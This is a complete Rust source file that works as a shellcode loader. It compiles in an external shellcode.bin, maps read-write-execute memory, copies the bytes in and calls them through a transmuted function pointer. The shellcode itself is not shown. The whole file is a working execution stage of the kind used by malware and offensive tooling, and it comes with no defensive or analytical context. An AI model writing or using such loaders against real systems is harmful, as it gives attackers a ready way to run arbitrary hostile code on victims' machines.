use mmap::{
    MapOption::{MapExecutable, MapReadable, MapWritable, MapFd},
    MemoryMap,
};
use std::{fs::File, os::fd::IntoRawFd};
use std::mem;
//note: MapFd is needed for my MacOS ow it results in an error as compiler requires it
const SHELLCODE: &[u8] = include_bytes!("../../shellcode.bin");

fn main() {
    // Create a temporary file to map
    let file = File::create("temp_shellcode_file").expect("Failed to create temp file");

    // Create a MemoryMap with the length of the shellcode and with read, write, and execute permissions.
    let map = MemoryMap::new(SHELLCODE.len(), &[MapReadable, MapWritable, MapExecutable, MapFd(file.into_raw_fd())]).unwrap();
    // Unsafe code used to copy contents of shellcode into allocated memory
    unsafe {
        std::ptr::copy(SHELLCODE.as_ptr(), map.data(), SHELLCODE.len());
        // Transmute the memory map's data into a function pointer.
        let exec_shellcode: extern "C" fn() -> ! = mem::transmute(map.data());
        exec_shellcode();
    }
}
